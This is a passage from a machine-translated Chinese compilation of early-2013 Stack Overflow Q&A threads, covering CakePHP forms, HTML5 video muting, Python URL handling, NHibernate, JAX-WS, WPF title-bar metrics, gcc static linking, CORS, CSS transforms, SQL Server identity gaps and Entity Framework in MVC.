echo $this->Form->input('telephone2', array('label' => 'Mobile'));
echo $this->Form->input('email', array('label' => 'Email'));
echo $this->Form->input('domain', array('label' => 'Domain'));

$options = array(
    'label' => 'Add',
    'div' => array(
        'class' => 'btn btn-primary',
    )
);
echo $this->Form->end($options); 
```

在控制器中添加操作：

```
public function add() {
    if ($this->request->is('post')) {
        $this->Client->create();
        if ($this->Client->save($this->request->data)) {
            $this->Session->setFlash('Client has been saved.');
            $this->redirect(array('action' => 'index'));
        } else {
            $this->Session->setFlash('Unable to add your post.');
        }
    }
} 
```

再次感谢您的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T16:35:23.560

您的表单创建标签是

```
echo $this->form->create(); 
```

但应该是

```
echo $this->Form->create(); 
```

注意大写的F。刚在本地尝试过，小写的->form 报错信息失败。

# html - HTML5 视频静音但仍在播放

> ID：14111917
> 
> 赞同：35
> 
> 时间：2013-01-01T16:05:37.073
> 
> 标签：html, google-chrome, video

标题几乎说明了一切。我有一个视频在到达页面时自动开始播放。

在 HTML 代码中，我设置了 muted="muted"。奇怪的部分来了。查看控件时，它显然已静音，但仍在播放音乐并且可以听到。即使当我查看 W3Schools 上的 HTML5 视频示例时，它也会在静音时播放音乐。

有什么办法，例如通过 jQuery 绕过这个？我在其中有一条 jQuery 行，它将静音粘贴到视频中，但这没有任何效果。

这是使用的 HTML 代码：

```
<video id="video" width="640px" height="350px" autoplay="autoplay" loop="loop" controls="controls" muted="muted">
            <source src="intouchables.f4v" type="video/mp4">
            Your browser does not support the video tag.
        </video> 
```

希望你能帮助我。jQuery 行如下：

$("video").prop('静音', true);

提前致谢。

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2019-05-01T18:13:59.967

在 Angular 的情况下，可以尝试**[muted]="'muted'"**，它对我有用。

```
<video id="video" style="width:100%; height:100%" autoplay [muted]="'muted'" loop>
  <source src="./../../assets/video/model-video.mp4" type="video/mp4">
</video> 
```

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2013-01-02T07:27:22.873

我不完全确定为什么在标签中`muted`定义属性时出现故障。`video`但是，这是您可以做的：

首先，`muted="muted"`从视频标签中删除属性。保持简单：

```
<video id="video" width="640px" height="350px" autoplay="autoplay" loop="loop" controls="controls">
    <source src="intouchables.f4v" type="video/mp4">
    Your browser does not support the video tag.
</video> 
```

现在，定义一个在加载页面时使视频静音的函数。

```
window.onload = function () {
    var element = document.getElementById('video');
    element.muted = "muted";
} 
```

我已经验证了这一点，并且有效。

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2018-08-08T20:29:50.787

我的回答中没有真正的新答案——只是试图更新这个问题，并希望避免人们像我刚刚做的那样浪费一整天的时间。

据我所知（特别是因为这个问题太老了），当视频被动态添加到页面时，`muted`它**从未起作用。**既然`muted`不起作用，那么`muted autoplay`也不会起作用。

我认为发生的情况是浏览器在页面加载时做出了某些决定，并且由于某些非常奇怪的原因，即使页面具有`muted`属性，稍后添加到页面的视频也不会静音。我认为这是 Chrome 中的一个错误，在 Safari 中不会发生在我身上——但看起来我们现在被困住了。

谷歌[关于自动播放/静音的博客条目](https://developers.google.com/web/updates/2017/09/autoplay-policy-changes)只有一年的历史，并提供了以下见解：

> Chrome 的自动播放策略很简单：
> 
> *   始终允许静音自动播放。
> *   在以下情况下允许自动播放声音：
>     *   用户与域进行了交互（单击、点击等）。
>     *   在桌面上，用户的媒体参与指数阈值已被超过，这意味着用户之前播放过有声视频。
>     *   在移动设备上，用户已将网站添加到他或她的主屏幕。
> *   顶级框架可以将自动播放权限委托给其 iframe 以允许自动播放声音。

只少了一件大事！

> *   “静音”HTML 属性仅在初始加载时 HTML 中存在视频时生效。这也适用于“自动播放静音”视频。

那么这有什么影响：

> *   如果以编程方式播放没有声音的视频，则必须先将其静音。因此，如果将动态视频添加到页面，则必须`video.muted = true`在将其添加到 DOM 之后（或在播放之前）显式设置。
> *   如果您尝试以`video.play()`编程方式执行（例如，当有人向下滚动经过静音视频并且您希望它播放时），则必须先将视频静音。

我在 Angular 中遇到了这个问题，并花了太多时间假设它与我使用模板的事实有关，或者与 Angular 相关。

我在 StackBlitz 上做了一个测试应用。您需要取消注释该行`// video.muted = true`以使其正常工作。

[https://stackblitz.com/edit/angular-ze4t9y](https://stackblitz.com/edit/angular-ze4t9y)

要实现的其他重要事项是：

*   即使视频实际上没有声音，也必须将其静音。如果需要，请使用“[兔子”视频进行测试。](https://archive.org/download/BigBuckBunny_124/Content/big_buck_bunny_720p_surround.mp4)
*   博客中概述的较新的“媒体参与”规则可能会在测试页面时让您感到困惑，因为您将与该页面进行交互。您必须做的是关闭浏览器，或以隐身模式打开一个新窗口 - 以重置此参与规则（请参阅博客条目）。

如果您在用户没有首先“参与”页面时尝试播放非静音视频，您将在浏览器中看到的错误如下所示。如果您在非静音视频中没有看到此消息，则 Chrome 可能已允许该视频播放，因为您与该页面进行了交互。

[![在此处输入图像描述](../Images/ed367e10a032770a511e0c5b287201ef.png)](https://i.stack.imgur.com/kVVzX.png)

最后，如果您使用的是 Angular（所有内容都是动态添加的），则可以使用以下方法使视频静音：

```
 @ViewChild('bunnyVideo', { read: ElementRef }) bunnyVideo: ElementRef; 
```

然后当你想玩它时：

```
 const video: HTMLVideoElement = this.bunnyVideo.nativeElement;

 // explicitly mute it...
 video.muted = true;

 // ...before attempting to play
 video.play().catch((err) => {
    alert('video error ' + err);
 }); 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2019-02-07T12:00:36.417

这对我来说很好。

```
<video oncanplay="this.muted=true" id="video" width="640px" height="350px" autoplay="autoplay" loop="loop" controls="controls">
            <source src="intouchables.f4v" type="video/mp4">
            Your browser does not support the video tag.
</video> 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2018-01-29T22:21:15.883

看起来这个静音在 chrome 64 中停止工作。在 63 中仍然有效。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2015-02-02T15:21:47.757

```
<video preload= "true" autoplay = "autoplay" loop = "loop" muted>
    <source src = "video/Real-Estate.mp4" type = "video/mp4">
</video> 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-04-20T03:21:25.980

要直接通过 HTML5 而不是 jQuery 静音，您也可以`volume="0"`在 video 标签内使用，即：

```
<video preload="true" autoplay="" volume="0" poster="img/example.jpg"> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-01-18T06:52:42.130

确保在制作视频时将音频编解码器设置为 AAC。我在使用默认设置为 AC3 的 OpenShot 时遇到了同样的问题。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-09-09T22:11:35.823

对于 html5 使用：

```
<video controls loop muted height="" width=""  >

  <source src="" type="video/(put format here ex .mp4)" />
<source src="" type="video/(put another format of same video here if there is one ex .wav)" />
Your browser does not support the HTML5 element.
</video> 
```

这是 w3c 的好去处。

![1](../Images/6fdec90b9465ca99802dbcecdb940df7.png)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-10-29T12:15:08.500

```
<video class="" autoplay loop [muted] = "'muted'">
    <source src= "video url/video path" type = "video/mp4">
</video> 
```

// 尝试这个。它在我的设备上正常工作。当您的视频有声音时，浏览器（谷歌）会尝试阻止视频。所以视频不会自动播放。因此，请尝试将音频静音。只提到静音它对我不起作用。所以我尝试了绑定方法。现在它和我一起工作得很好。我建议尝试一次

# python - Mechanize 和 Beautifulsoup httplib.InvalidURL 出错：非数字端口：''（Python）

> ID：14111919
> 
> 赞同：0
> 
> 时间：2013-01-01T16:05:39.443
> 
> 标签：python, beautifulsoup, mechanize

我正在浏览一个 URL 列表，并使用 Mechanize/BeautifulSoup 用我的脚本打开它们。

但是我收到此错误：

```
File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/httplib.py", line 718, in _set_hostport
    raise InvalidURL("nonnumeric port: '%s'" % host[i+1:])
httplib.InvalidURL: nonnumeric port: '' 
```

这发生在这行代码中：

```
page = mechanize.urlopen(req) 
```

以下是我的代码。任何洞察我做错了什么？许多 URL 都有效，当它遇到某些 URL 时，我会收到此错误消息，所以不知道为什么。

```
from mechanize import Browser
from BeautifulSoup import BeautifulSoup
import re, os
import shutil
import mechanize
import urllib2
import sys
reload(sys)
sys.setdefaultencoding("utf-8")

mech = Browser()
linkfile = open ("links.txt")
urls = []
while 1:
    url = linkfile.readline()
    urls.append("%s" % linkfile.readline())
    if not url:
        break

for url in urls:
    if "http://" or "https://" not in url: 
        url = "http://" + url
    elif "..." in url:
    elif ".pdf" in url:
        #print "this is a pdf -- at some point we should save/log these"
        continue
    elif len (url) < 8:
        continue
    req = mechanize.Request(url)
    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:17.0) Gecko/20100101 Firefox/17.0')
    req.add_header('Accept-Language', 'Accept-Language  en-US,en;q=0.5')
    try:
        page = mechanize.urlopen(req)
    except urllib2.HTTPError, e:
        print "there was an error opening the URL, logging it"
        print e.code
        logfile = open ("log/urlopenlog.txt", "a")
        logfile.write(url + "," + "couldn't open this page" + "\n")
        pass 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:22:46.027

我认为这段代码

```
if "http://" or "https://" not in url: 
```

没有做你想做的（或你认为它会做的）。

```
if "http://" 
```

将始终评估为 true，因此您的 URL 永远不会添加前缀。您需要将其（例如）重写为：

```
if "https://" not in url and "http://" not in url: 
```

此外，现在我开始测试你的作品：

```
urls = []
while 1:
    url = linkfile.readline()
    urls.append("%s" % linkfile.readline())
    if not url:
        break 
```

这实际上确保您的 URL 文件被不正确地读取并且每第二行被读取，您可能希望这样读取：

```
urls = []
while 1:
    url = linkfile.readline()
    if not url:
        break
    urls.append("%s" % url) 
```

这样做的原因是 - 你调用`linkfile.readline()`了两次，强制它读取 2 行并且只将每 2 行保存到你的列表中。

此外，您希望该`if`子句在附加之前，以防止列表末尾出现空条目。

但是您的特定 URL 示例对我有用。更多信息，我可能需要你的链接文件。

# nhibernate - 急切加载孩子的问题

> ID：14111924
> 
> 赞同：0
> 
> 时间：2013-01-01T16:06:09.250
> 
> 标签：nhibernate, fluent-nhibernate

我正在使用 NHibernate 和 FluentNH。

以下是四门课。

**表单类型**

```
 public class FormType
  {
    public virtual int Id
    { get; set; }

    public virtual string Name
    { get; set; }

    public virtual IList<KeyCompetency> KeyCompetencies 
    { get; set; }
  } 
```

**关键能力**

```
 public class KeyCompetency
  {
    public virtual int Id
    { get; set; }

    public virtual string Name
    { get; set; }

    public virtual FormType FormType
    { get; set; }

    public virtual IList<SubCompetency> SubCompetencies 
    { get; set; }
  } 
```

**子能力**

```
 public class SubCompetency
  {
    public virtual int Id
    { get; set; }

    public virtual string Name
    { get; set; }    

    public virtual KeyCompetency KeyCompetency
    { get; set; }

    public virtual IList<Ability> Abilities 
    { get; set; }
  } 
```

**能力**

```
 public class Ability
  {
    public virtual int Id
    { get; set; }

    public virtual string Description
    { get; set; }

    public virtual SubCompetency SubCompetency
    { get; set; }
  } 
```

我正在尝试加载基于 id 的表单类型。

```
using (var session = DataContext.OpenSession())
{
    return session.Query<FormType>()
                  .Where(x => x.Id == 1)
                  .FetchMany(x => x.KeyCompetencies)
                  .ThenFetchMany(x => x.SubCompetencies)
                  .ThenFetchMany(x => x.Abilities)
                  .ToList().FirstOrDefault();
} 
```

我收到重复的关键能力、子能力记录。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T18:52:17.587

映射集合`Set`以避免此问题。[请参阅此问题](https://stackoverflow.com/questions/6194734/nhibernate-thenfetchmany-is-retrieving-duplicate-children)的答案。此外，由于您是按身份选择，因此最好使用`.SingleOrDefault`而不是`FirstOrDefault`.

# java - 使用返回自定义类型的函数创建 Web 服务 (JAX-WS)

> ID：14111925
> 
> 赞同：0
> 
> 时间：2013-01-01T16:06:12.083
> 
> 标签：java, web-services, soap, jax-ws, tomcat7

我阅读了很多关于这个问题的帖子，我确实找到了一些可以解决这个问题的帖子——但不幸的是，我无法真正理解如何解决我的问题。

现在我正在创建 WebService（使用 Tomcat 7），并且我想共享接口。我有大约 8 个相互关联的接口。例如：

```
@WebService
@SOAPBinding(style = Style.RPC)
interface A {
  public String method1();
}

@WebService
@SOAPBinding(style = Style.RPC)
interface B {
  public String method1();
  public A getA();
}

@WebService
@SOAPBinding(style = Style.RPC)
interface C {
  public A getA();
  public B getB();
} 
```

问题是，在我创建 WAR（用于接口 C）文件并尝试在 tomcat 中部署 web 服务后，我从 tomcat 收到一个错误，如下所示：

> 严重：WSSERVLET11：无法解析运行时描述符：com.sun.xml.ws.spi.db.DatabindingException：com.sun.xml.bind.v2.runtime.IllegalAnnotationsException：IllegalAnnotationExceptions com.mkyong.ws.ITest 计数为 1一个接口，而 JAXB 不能处理接口。此问题与以下位置有关：在 com.mkyong.ws.ITest
> 
> com.sun.xml.ws.spi.db.DatabindingException: com.sun.xml.bind.v2.runtime.IllegalAnnotationsException: 1 counts of IllegalAnnotationExceptions com.mkyong.ws.ITest 是一个接口，JAXB 不能处理接口. 此问题与以下位置有关：在 com.mkyong.ws.ITest

有谁知道如何解决它？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T07:37:53.230

不能使用 JAX-WS 返回接口类型。返回类型和参数必须是一个实际的类。RMI 将为此提供接口。JAX-WS 没有。

# .net - 如何检索窗口的最小化、最大化和关闭按钮的大小？

> ID：14111926
> 
> 赞同：5
> 
> 时间：2013-01-01T16:06:16.553
> 
> 标签：.net, wpf, windows, titlebar

到目前为止，我尝试通过 SendMessage 和其他几个调用使用 GetThemePartSize、GetThemeMetric、GetSystemMetrics、WM_GETTITLEBARINFOEX，但没有任何东西接近实际尺寸（启用了主题的 Windows 7）。

基本上我的问题是：如何获取这些按钮的大小（和位置，理想情况下甚至处理）以及从 GetThemePartSize 检索到的值甚至意味着什么？它们有什么用？

我已经看过[这个答案](https://stackoverflow.com/questions/8775428/what-uxtheme-function-i-must-use-to-get-the-default-size-of-the-minimize-maximi)和许多其他答案，但它们根本不起作用。

谢谢

**更新**

对于汉斯：

```
[DllImport("uxtheme", ExactSpelling=true)]
private extern static Int32 GetThemePartSize(IntPtr hTheme, IntPtr hdc, WindowPart part, WindowPartState state, ref RECT pRect, ThemeSize eSize, out SIZE size);

[StructLayout(LayoutKind.Sequential)]
private struct RECT
{
    public int left; 
    public int top; 
    public int right;
    public int bottom;
}

[StructLayout(LayoutKind.Sequential)]
private struct SIZE
{
    public int cx;
    public int cy;
} 

private const int TS_TRUE = 1;
private const int CBS_NORMAL = 1;
private const int WP_CLOSEBUTTON = 18;
private const string VSCLASS_WINDOW = "WINDOW";

/* inside a method */
var rect = new RECT {left = 0, right = 200, top = 0, bottom = 200};
var size = new SIZE();
var windowHandle = new WindowInteropHelper({MyWindow}).Handle;
var theme = OpenThemeData(windowHandle, VSCLASS_WINDOW);
GetThemePartSize(theme, null, WP_CLOSEBUTTON, CBS_NORMAL, ref rect, TS_TRUE, ref size);

// result on w7 with default theme -> size.cx == 28, size.cy == 17 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T20:13:31.333

在浏览了 Firefox 17.0.1 源代码（即文件 nsNativeThemeWin.cpp 和 nsUXThemeData.cpp）后，我能够为在 Vista 或更新版本上运行的桌面应用程序提出部分解决方案，以满足我的需求：

```
private const int DWMWA_CAPTION_BUTTON_BOUNDS = 5;

[StructLayout(LayoutKind.Sequential)]
public struct RECT
{
    public int left;
    public int top;
    public int right; 
    public int bottom;
}

[DllImport("dwmapi.dll")]
public static extern int DwmGetWindowAttribute(IntPtr hwnd, int dwAttribute, out RECT pvAttribute, int cbAttribute);

var windowHandle = new WindowInteropHelper(Main.Instance).Handle;
var buttonsRect = new RECT();
var sizeButtonsRect = Marshal.SizeOf(buttonsRect);
DwmGetWindowAttribute(windowHandle, DWMWA_CAPTION_BUTTON_BOUNDS, out buttonsRect, sizeButtonsRect); 
```

存储在buttonsRect中的结果有点奇怪：宽度差（右-左== 105）完全符合实际边界，但是，高度差（29px）比按钮实际占用的区域大8像素。

由于这并不能真正完整地回答任何问题，因此我将保留此线程以供进一步答复。

再次感谢 Hans 的宝贵和深思熟虑的评论。正如您可以清楚地看到的，这完全与编程语言和代码片段有关。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T16:50:01.500

您可以将 Microsoft.Windows.Shell.dll 与自定义 chrome 窗口库结合使用来修改或处理您的窗口按钮。我正在使用它来创建 Windows 8 ui 风格的应用程序

[http://www.codeproject.com/Articles/131515/WPF-Custom-Chrome-Library](http://www.codeproject.com/Articles/131515/WPF-Custom-Chrome-Library)

[http://archive.msdn.microsoft.com/WPFShell](http://archive.msdn.microsoft.com/WPFShell)

# iphone - 从静态单元格导航到每个单元格的不同视图控制器

> ID：14111927
> 
> 赞同：-1
> 
> 时间：2013-01-01T16:06:23.347
> 
> 标签：iphone, ios, xcode

我已经尝试了许多教程和示例代码来尝试为我的应用程序创建一个初始菜单，该菜单将允许导航到不同的视图控制器并返回到初始的“菜单”视图控制器。

我尝试了一个带有按钮的常规视图控制器，但是当我尝试实现从每个到不同视图控制器的 segues 时出现错误。我尝试使用包装在导航控制器中的 tableview 控制器来启动，但找不到一个示例可以让我将每个单元格转到不同的视图控制器并导航回“菜单”控制器。

这似乎是一种常见的导航场景，那么为什么我找不到任何如何完成此操作的示例？有人对这些方面的示例有任何建议或链接吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T19:35:31.773

要完成此操作，您可以使用两种方法，

1.  使用按钮并进行按钮操作以导航到另一个视图。

2.  使用 TableView 单元格。

这是 tableView 单元格的代码

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView          
{
   //Return the number of buttons you have
}
- (NSInteger)tableView:(UITableView *)table numberOfRowsInSection:(NSInteger)section
{
    return 1;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath: (NSIndexPath *)indexPath
{
       //You can use either switch cases to load the table view with the buttons you have.
}

-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
 {
  [tableView deselectRowAtIndexPath:indexPath animated:YES];
      switch(indexPath.Section)
      {  
         Case 0:
         {
              //Code to push new controller
         }
      }
 } 
```

# c# - 访问列表列表

> ID：14111928
> 
> 赞同：-1
> 
> 时间：2013-01-01T16:06:30.583
> 
> 标签：c#, list

我创建了一个列表列表来存储随机生成的数据，但是我的实现显示以下智能感知错误“变量名称在当前上下文中不存在”。我哪里出错了？这是我的代码的必需部分。

```
 List<List<string>> DataList = new List<List<string>>();
           //Some Code
            for (int i = 0; i < num; i++)
            {
                List<string> strVal = new List<string>();
                foreach (string someVal in SomeList)
                {                    
                    //Some Code
                    strVal.Add(data);
                }

                DataList.Add(strVal);
            }

            for (int i = 0; i < num; i++)
            {
                foreach (IList<string> name in DataList)
                {
                    foreach (string listVal in strVal) // Error Here
                    {
                        //Some Code
                    }                    
                }
            } 
```

我哪里出错了？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:07:22.253

您`strVal` **在**第一个`for`循环中定义并尝试在第二个循环中访问它。

`strVal``for`在第一个循环结束时超出范围。在第一个循环之外定义它，以便两个循环都可以访问它。

```
List<List<string>> DataList = new List<List<string>>();
//Some Code
List<string> strVal = new List<string>();
for (int i = 0; i < num; i++)
{        
    foreach (string someVal in SomeList)
    {                    
        //Some Code
        strVal.Add(data);
    }
    DataList.Add(strVal);
}
for (int i = 0; i < num; i++)
{
    foreach (IList<string> name in DataList)
    {
       foreach (string listVal in strVal)
       {
            //Some Code
       }                    
    }
} 
```

这就是导致您的错误的原因，尽管它可能不是您打算做的。请参阅@Chen 的答案以获得更合乎逻辑的内容:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:08:09.963

```
 foreach (IList<string> name in DataList)
            {
                foreach (string listVal in strVal) // Error Here
                {
                    //So 
```

应该

```
 foreach (IList<string> name in DataList)
            {
                foreach (string listVal in name ) // Error Here
                {
                    //So 
```

# linux - linux/gcc的库处理

> ID：14111929
> 
> 赞同：0
> 
> 时间：2013-01-01T16:06:39.337
> 
> 标签：linux, gcc, shared-libraries, static-libraries

我目前正在做一个更大的项目，其中包含很多库，我对为什么 linux 下的 gcc 会表现得这样有一些疑问。

首先，我想您可能知道，您可以使用 gcc/g++ 的“-lxyz”链接器标志在某些系统路径中搜索 libxyz.so 并链接到它。但是，这在静态库的情况下不起作用，即如果我想链接 libxyz.a，我必须明确添加 /usr/lib/libxyz.a 作为目标文件。

我的问题如下：如果我想在我的项目中包含一个 pkg-config 样式的 .pc 文件，如果用户选择构建一个静态库，我应该在其中放入什么？

此外，我发现 gcc/g++ 没有按照我期望的方式处理库依赖关系，这很烦人：

如果我将我的程序链接到 libabc.so，并且如果 ldd 告诉我 libabc.so 依赖于 libxyz.so，那么我认为 gcc/g++ 应该足够聪明，也可以链接到 libxyz.so。可悲的是，情况似乎并非如此。有什么好的理由为什么这不起作用或者是否有可能强制 gcc/g++ 考虑这些依赖关系？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:34:14.923

如果您不想指定静态库的完整路径，则无需指定完整路径，但您需要通知链接器您要链接静态库而不是动态库。

这可以通过 to 的`-Bstatic`参数来完成`ld`，您可以通过 gcc 或 g++ 传递该参数`-Wl,-Bstatic`（有变体，请参阅 参考资料`man ld`）。

例如：

```
gcc -o main main.c -Wl,-Bstatic -lfoo -Wl,-Bdynamic -lbar 
```

将`main`与 a`libfoo.a`但 a链接`libbar.so`。动态是支持 if（对于 GNU ld）的平台上的默认设置。如果你把类似的东西放在一个`pkg-config`设置或类似的地方，在你的静态库之后重置为默认值是礼貌的。

至于您问题的第二部分，这有点令人费解，因为至少在 Linux 上这不是必需的（或实际上是好的做法）。您的可执行文件应该只包含`NEEDED`它直接依赖的库的条目。运行时链接器将在必要时负责加载这些依赖项。（为什么这是一个好的做法？因为您不想导入间接依赖项 - 如果您依赖的库更改了自己的依赖项（例如在更新之后），您的可执行文件仍会加载有问题的旧依赖项并且可能引入错误。）

例如，假设我`main`调用了 in 中的一个函数`libfoo.so`，而该函数恰好调用了 in 中的一个函数`libbar.so`。要在可执行文件中注册的“正确”依赖项：

```
$ readelf -d libbar.so | grep Shared
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
$ readelf -d libfoo.so | grep Shared
 0x0000000000000001 (NEEDED)             Shared library: [libbar.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
$ readelf -d a.out | grep Shared
 0x0000000000000001 (NEEDED)             Shared library: [libfoo.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] 
```

`ldd`（它调用运行时链接器来完成它的工作）可以解决所有问题：

```
$ ldd a.out 
linux-vdso.so.1 (0x00007fff813ff000)
libfoo.so => ./libfoo.so (0x00007f48ee99d000)
libc.so.6 => /lib64/libc.so.6 (0x00007f48ee5c8000)
libbar.so => ./libbar.so (0x00007f48ee3c6000)
/lib64/ld-linux-x86-64.so.2 (0x00007f48eeb9f000) 
```

# javascript - 您需要针对 CORS 的保护吗？

> ID：14111944
> 
> 赞同：-2
> 
> 时间：2013-01-01T16:08:05.263
> 
> 标签：javascript, cors

我有一个`domain/logout.php`-file 来注销用户。据我了解，黑客可以在他的网站上让受害者使用`credentials`on 向我的服务器发送 CORS 请求。这会将请求发送到我的服务器，它将注销用户，但是由于我的服务器没有发回正确的标头，因此受害者浏览器将不会显示`domain/logout.php`.

因此，黑客可以使用 CORS 发送比登出用户更邪恶的请求，但只要服务器不包含正确的 CORS 标头，它就不会得到服务器的响应。

当 W3C 有这个安全漏洞时，为什么它真的实现了这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:34:28.020

我认为您对CORS感到困惑。CORS 标头由服务器发送，不是任何客户端请求的一部分。如果客户支持他们，他们只会解释他们。

其次，如果您正在处理客户端脚本，特别是一般的 jquery 和 javascript ajax，这变得很重要。对于服务器到服务器的通信，任何人都不需要像这样注销您的客户。

对于您的注销表单的任何外部请求，客户端首先必须在“注销”之前登录，否则没有人可以注销。

对于 PHP - PHP 通信，您不需要 CORS。您需要防止未经授权的访问，特别是对于发生数据库操作的区域

# html - 如何执行多个 2D 变换？

> ID：14111947
> 
> 赞同：3
> 
> 时间：2013-01-01T16:08:22.517
> 
> 标签：html, css, css-transforms

`div`我想同时为一个元素允许多个转换（旋转、翻译等） 。

我似乎无法做到这一点，因为只应用了一个转换（第一个），使用以下代码：

```
<!DOCTYPE html>
<html>
    <head>
    <style> 
        div {
            width:100px;
            height:75px;
            background-color:#FFCC00;
            border:1px solid black;
        }

        div#div2 {
            transform:rotate(45deg);
            -ms-transform:rotate(45deg); /* IE 9 */
            -moz-transform:rotate(45deg); /* Firefox */      
            -webkit-transform:translate(50px,100px); /* Safari and Chrome */
            -webkit-transform:rotate(45deg); /* Safari and Chrome */
            -o-transform:rotate(45deg); /* Opera */
        }

    </style>
    </head>
<body>
    <div>This is a DIV element.</div>
    <div id="div2">This is a DIV element + Transformation</div>
</body>
</html> 
```

在 Chrome 上测试，只有旋转受到影响，即使位于第一个位置（旋转之前），平移也没有影响。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:21:20.577

的形式语法为[`transform`](https://developer.mozilla.org/en-US/docs/CSS/transform)：

```
transform: <transform-function> [<transform-function>]* | none 
```

为了执行多个转换，您必须连接转换函数：

```
-webkit-transform: translate(50px,100px) rotate(45deg);
-moz-transform: translate(50px,100px) rotate(45deg);
-ms-transform: translate(50px,100px) rotate(45deg);
-o-transform: translate(50px,100px) rotate(45deg);
transform: translate(50px,100px) rotate(45deg); 
```

这是**[jsFiddle 上的实时演示](http://jsfiddle.net/WZgaz/4/)**，基于您的代码。

### 进一步阅读

*   在 Mozilla 开发者网络上[使用 CSS 转换](https://developer.mozilla.org/en-US/docs/CSS/Tutorials/Using_CSS_transforms)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T16:20:31.360

属性是唯一的，不像对函数的顺序调用那样工作，它们只是覆盖前面的定义。因此，您需要一次性完成转换，如下所示（在 Firefox 17 中测试）：

```
transform:rotate(45deg) translate(50px,100px); 
```

# sql-server - 在 IGNORE_DUP_KEY = ON 的重复插入时，PK 没有自动增量

> ID：14111948
> 
> 赞同：0
> 
> 时间：2013-01-01T16:08:25.637
> 
> 标签：sql-server, entity-framework, sqlbulkcopy

我设置了 IGNORE_DUP_KEY = ON 所以当我们尝试插入大量数据时没有警告。但是，每个重复行的主键都会增加，因此当您有 20 个重复行之后，可以从 Id 100 变为 120。有没有办法让它在 101 继续而不手动设置值？我正在使用 SqlBulkCopy 和 Entity Framework，我对使用 SQL 查询来解决这个问题不感兴趣（例如，使用 NOT EXISTS）。当然，我们可以先检查记录是否已经存在，但出于性能原因我们不希望这样做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T22:05:05.477

如果您需要连续的身份值，那么`IDENTITY`不适合您。绝对不能保证身份值不会丢失。您的情况并不是发生这种情况的唯一情况。

要么自己管理 ID（例如，使用序列；不容易集成到批量加载中），要么放弃拥有不间断 ID 的要求。

# c# - 在 ASP.NET MVC 中从数据库中检索内容

> ID：14111951
> 
> 赞同：1
> 
> 时间：2013-01-01T16:08:29.667
> 
> 标签：c#, asp.net, asp.net-mvc, entity-framework

在从数据库中检索内容并通过控制器和视图对其进行可视化时，您如何以优雅而健壮的方式混合 ASP.NET MVC 和实体框架的概念？

下面的例子会抛出 Dispose 异常，因为在 using 语句关闭后会显示 View。

```
 // code in controller
        using (var usersDb = new UsersDb(new WebSecurityWrapper()))
        {
            var user = usersDb.GetUser(User.Identity.Name);
            return View(user);
        }

        // code in usersDb model -- GetUser method
        public User GetUser(string name)
        {
            var id = _webSecurity.GetUserId(name);
            var user = Users.FirstOrDefault(usr => usr.Id == id);

            return user;
        } 
```

很明显，但我能想到的唯一选择是“克隆”用户对象，以便 View 可以独立显示它。这感觉不对。

那么这样做的适当方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T18:01:59.997

我认为您正在视图中使用 User 对象的导航属性。这些可能是以一种懒惰的方式评估的。

User 对象是在您退出该方法之前创建的。不知何故，您正在请求在视图中查询的额外信息。但由于处置已经发生，这会导致异常。

一种选择是使用[Include](https://stackoverflow.com/questions/3356541/entity-framework-linq-query-include-multiple-children-entities)立即查询额外的必要数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:39:42.830

```
 User user;
    using (var usersDb = new UsersDb(new WebSecurityWrapper()))
    {
        user = usersDb.GetUser(User.Identity.Name);
    }

    return View(user); 
```

# parsing - 是否可以将 OpenNLP 用于 HTML 格式的文本内容？

> ID：14111953
> 
> 赞同：1
> 
> 时间：2013-01-01T16:09:08.820
> 
> 标签：parsing, html-parsing, text-mining, apache-tika, opennlp

我需要在 HTML 文档中插入 CSS id 来标记段落和句子。格式化 HTML 有很多不同的方法，因此很难找到一种一致的方法来解析它们。例如，一些蹩脚的 html use `<table>`，另一些 use `<P>`，一些其他 use `<div>`，等等。一些使用组合。

输入：

```
<p> This is a sentence, with stuff.  Mr. John doe was walking down the street. Mrs. Daisy knows how to drive but does not drive.  The car is fast, but is an ugly color.  This is an example of a paragraph. </P>

<br>

<div> However, sometimes, paragraphs on HTML pages are not tagged as with a consistent format.  This makes it hard to identify paragraphs and sentences.  I need a solution to tag them with CSS id's</div> 
```

输出

```
